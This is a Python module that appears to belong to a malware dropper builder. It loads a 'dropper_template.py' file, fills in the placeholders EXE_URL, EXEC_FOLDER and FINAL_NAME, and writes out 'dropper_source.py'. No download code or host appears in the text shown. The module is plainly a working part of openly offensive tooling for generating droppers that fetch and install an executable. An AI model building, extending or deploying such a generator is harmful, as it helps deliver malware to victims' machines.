#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Generator module - template loading + source generation.
"""

import os

from .ui import info, success, error


# ============================================================
# TEMPLATE HANDLING
# ============================================================
TEMPLATE_DIR = "templates"
TEMPLATE_FILE = "dropper_template.py"


def load_template(template_path=None):
    """Load dropper template from disk."""
    if template_path is None:
        template_path = os.path.join(TEMPLATE_DIR, TEMPLATE_FILE)

    if not os.path.exists(template_path):
        error(f"Template not found: {template_path}")
        return None

    try:
        with open(template_path, "r", encoding="utf-8") as f:
            return f.read()
    except Exception as e:
        error(f"Failed to read template: {e}")
        return None


def render_template(template, config):
    """Fill placeholders in template."""
    try:
        return template.format(
            EXE_URL=config["EXE_URL"],
            EXEC_FOLDER=config["EXEC_FOLDER"],
            FINAL_NAME=config["FINAL_NAME"],
        )
    except KeyError as e:
        error(f"Missing placeholder in template: {e}")
        return None
    except Exception as e:
        error(f"Template render error: {e}")
        return None


def generate_source(config, temp_dir, template_path=None):
    """Generate .py source file with injected config."""
    template = load_template(template_path)
    if template is None:
        return None

    source = render_template(template, config)
    if source is None:
        return None

    py_path = os.path.join(temp_dir, "dropper_source.py")
    try:
        with open(py_path, "w", encoding="utf-8") as f:
            f.write(source)
        return py_path
    except Exception as e:
        error(f"Failed to write source: {e}")
        return None